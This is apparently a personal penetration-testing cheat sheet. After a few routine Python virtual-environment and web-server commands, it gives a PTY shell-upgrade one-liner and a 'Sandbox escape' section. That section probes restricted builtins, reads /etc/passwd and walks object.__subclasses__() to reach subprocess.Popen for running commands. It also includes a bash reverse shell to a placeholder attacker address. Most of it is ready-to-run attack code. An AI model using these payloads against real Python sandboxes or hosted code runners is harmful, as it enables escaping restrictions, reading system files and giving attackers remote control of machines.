```
python -m venv myenv
source myenv/bin/activate  # On Windows use: myenv\Scripts\activate
pip install <package-name>

Start Web server `python3 -m http.server 80`
Start virtual environment `python3 -m venv myenv | source myenv/bin/activate | deactivate`

Start PTY shell `python3 -c 'import pty;pty.spawn("/bin/bash")'`
```

Sandbox escape:

```
print('test')  # Does this work?

__import__('os')  # Is 'import' or 'os' restricted?

eval('2+2')       # Is 'eval' restricted?

open('/etc/passwd').read()  # 'open'? 'read'?

keywords = ['import', 'os', 'sys', 'eval', 'exec', 'open', 'read', '__import__', 'subprocess', 'socket']
for kw in keywords:
    try:
        exec(f"{kw}")
    except Exception as e:
        print(f"{kw} => {e}")

```

```
for c in object.__subclasses__():
    if 'Popen' in str(c):
        print(c, object.__subclasses__().index(c))
<class 'subprocess.Popen'> 231

P = object.__subclasses__()[231]  # Replace 231 with actual index
out, err = P(['ls', '-la'], stdout=-1).communicate()
print(out.decode())

P(['bash', '-c', 'bash -i >& /dev/tcp/YOUR.IP/PORT 0>&1'], stdout=-1).communicate()


# if decode() or communicate() failes
print(P(['ls'], stdout=-1).communicate())

# if subprocess not in the list:
for i, c in enumerate(object.__subclasses__()):
    if 'subprocess' in str(c):
        print(i, c)

for i, c in enumerate(object.__subclasses__()):
    if 'function' in str(c) or 'io' in str(c) or 'process' in str(c):
        print(i, c)

```